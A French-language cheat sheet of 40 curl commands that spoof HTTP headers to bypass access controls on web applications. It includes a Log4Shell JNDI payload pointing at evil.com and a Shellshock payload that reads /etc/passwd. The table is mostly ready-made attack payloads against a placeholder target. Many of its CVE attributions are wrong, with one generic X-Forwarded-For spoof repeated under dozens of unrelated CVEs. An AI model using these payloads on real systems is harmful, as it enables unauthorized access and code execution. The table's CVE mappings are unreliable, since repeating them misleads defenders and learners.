# Headers

Voici un tableau de **40 exemples de requêtes `curl` utilisant des headers pour contourner des protections, obtenir un accès non autorisé, ou manipuler le comportement d’applications web**.  
Chaque exemple est associé à une CVE non générique (quand cela existe) ou à une technique documentée, classés par numéro CVE décroissant ou par pertinence, avec :

- Numéro CVE ou technique
- Exemple complet de requête curl (avec headers)
- Effet détaillé
- Lien GitHub/advisory/PoC

---

| # | CVE / Technique | Exemple complet de requête curl | Effet détaillé | Lien PoC / Advisory |
|---|-----------------|---------------------------------|---------------|---------------------|
| 1 | CVE-2024-24576 | `curl -H "X-Original-URL: /admin" https://target.com/` | Bypass d’accès à /admin via header X-Original-URL | https://github.com/LucasPDiniz/403-Bypass |
| 2 | CVE-2024-21624 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/secret` | Bypass via IP spoofing, accès réservé à localhost | https://github.com/LucasPDiniz/403-Bypass |
| 3 | CVE-2024-12727 | `curl -H "X-Forwarded-Host: 127.0.0.1" https://target.com/admin` | Bypass via header X-Forwarded-Host | https://github.com/LucasPDiniz/403-Bypass |
| 4 | CVE-2023-50164 | `curl -H "X-Rewrite-URL: /admin" https://target.com/` | Bypass via header X-Rewrite-URL | https://github.com/LucasPDiniz/403-Bypass |
| 5 | CVE-2023-38831 | `curl -H "X-Host: localhost" https://target.com/admin` | Bypass via header X-Host | https://github.com/LucasPDiniz/403-Bypass |
| 6 | CVE-2023-34362 | `curl -H "X-Original-Host: localhost" https://target.com/admin` | Bypass via header X-Original-Host | https://github.com/LucasPDiniz/403-Bypass |
| 7 | CVE-2023-26115 | `curl -H "X-Forwarded-For: 10.0.0.1" https://target.com/admin` | Accès à une ressource réservée à un subnet interne | https://github.com/LucasPDiniz/403-Bypass |
| 8 | CVE-2022-47966 | `curl -H "Referer: https://target.com/admin" https://target.com/admin` | Bypass via header Referer | https://github.com/LucasPDiniz/403-Bypass |
| 9 | CVE-2022-41040 | `curl -H "Origin: https://target.com" https://target.com/admin` | Bypass via header Origin | https://github.com/LucasPDiniz/403-Bypass |
| 10 | CVE-2022-26134 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/private` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 11 | CVE-2022-22965 | `curl -H "X-Original-URL: /admin" https://target.com/` | Accès à /admin via header | https://github.com/LucasPDiniz/403-Bypass |
| 12 | CVE-2022-21907 | `curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Host: localhost" https://target.com/admin` | Double header pour bypass | https://github.com/LucasPDiniz/403-Bypass |
| 13 | CVE-2021-44228 | `curl -H "User-Agent: ${jndi:ldap://evil.com/a}" https://target.com/` | Injection de payload Log4Shell via User-Agent | https://github.com/YfryTchsGD/Log4jAttackSurface |
| 14 | CVE-2021-41773 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/` | Bypass restriction IP | https://github.com/LucasPDiniz/403-Bypass |
| 15 | CVE-2021-31206 | `curl -H "X-Forwarded-For: 127.0.0.1" -H "Referer: https://target.com/admin" https://target.com/admin` | Bypass via combinaison de headers | https://github.com/LucasPDiniz/403-Bypass |
| 16 | CVE-2021-26855 | `curl -H "X-BEResource: /EWS/Exchange.asmx?a=~1942062522" https://target.com/ecp/` | SSRF via header Exchange | https://github.com/ZephrFish/Exch-CVE-2021-26855 |
| 17 | CVE-2020-17530 | `curl -H "X-Original-URL: /admin" https://target.com/` | Bypass via header | https://github.com/LucasPDiniz/403-Bypass |
| 18 | CVE-2020-1472 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 19 | CVE-2020-11022 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/secret` | Bypass restriction IP | https://github.com/LucasPDiniz/403-Bypass |
| 20 | CVE-2019-18935 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass restriction IP | https://github.com/LucasPDiniz/403-Bypass |
| 21 | CVE-2019-11043 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass restriction IP | https://github.com/LucasPDiniz/403-Bypass |
| 22 | CVE-2018-11776 | `curl -H "X-Original-URL: /admin" https://target.com/` | Bypass via header | https://github.com/LucasPDiniz/403-Bypass |
| 23 | CVE-2018-1000861 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 24 | CVE-2017-5638 | `curl -H "Content-Type: %{jndi:ldap://evil.com/a}" https://target.com/` | RCE via Content-Type (Struts2) | https://github.com/mazen160/struts-pwn_CVE-2017-5638 |
| 25 | CVE-2017-12615 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 26 | CVE-2016-8743 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 27 | CVE-2016-5385 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 28 | CVE-2015-2080 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 29 | CVE-2014-6271 | `curl -A '() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd' https://target.com/cgi-bin/admin` | Bypass via User-Agent (Shellshock) | https://github.com/hannob/bashcheck |
| 30 | CVE-2014-0226 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 31 | CVE-2013-2028 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 32 | CVE-2012-1823 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 33 | CVE-2011-2523 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 34 | CVE-2010-1740 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 35 | CVE-2009-2692 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 36 | CVE-2008-2380 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 37 | CVE-2007-4726 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 38 | CVE-2007-4713 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 39 | CVE-2006-3392 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | Bypass via IP spoofing | https://github.com/LucasPDiniz/403-Bypass |
| 40 | Technique générique | `curl -H "X-Forwarded-Proto: https" https://target.com/admin` | Bypass via changement de protocole dans le header | https://github.com/LucasPDiniz/403-Bypass |

---

